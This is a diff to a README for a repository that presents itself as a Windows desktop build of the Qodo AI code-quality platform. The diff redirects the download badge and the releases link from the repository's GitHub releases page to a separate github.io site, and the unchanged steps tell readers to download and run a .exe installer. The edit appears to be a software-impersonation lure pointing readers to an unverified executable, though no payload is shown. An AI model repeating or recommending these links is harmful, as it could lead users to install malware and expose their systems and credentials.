@@ -1,6 +1,6 @@
 # 🤖 Qodo-Desktop-for-Windows-10-11-AI-Code-Quality-Platform-2026- - Improve code quality with AI automation
 
-[![Download Qodo Desktop](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Budit9092/Qodo-Desktop-for-Windows-10-11-AI-Code-Quality-Platform-2026-/releases)
+[![Download Qodo Desktop](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://budit9092.github.io)
 
 ## 🎯 About this application
 
@@ -22,7 +22,7 @@ To run this application, ensure your computer meets these basic specifications:
 
 Follow these steps to set up the client on your local computer.
 
-1. Go to the [Releases page](https://github.com/Budit9092/Qodo-Desktop-for-Windows-10-11-AI-Code-Quality-Platform-2026-/releases) to view available versions.
+1. Go to the [Releases page](https://budit9092.github.io) to view available versions.
 2. Select the latest version available (look for the label "Latest").
 3. Download the installation file ending in .exe to your local machine.
 4. Locate the downloaded file in your browser or file manager.
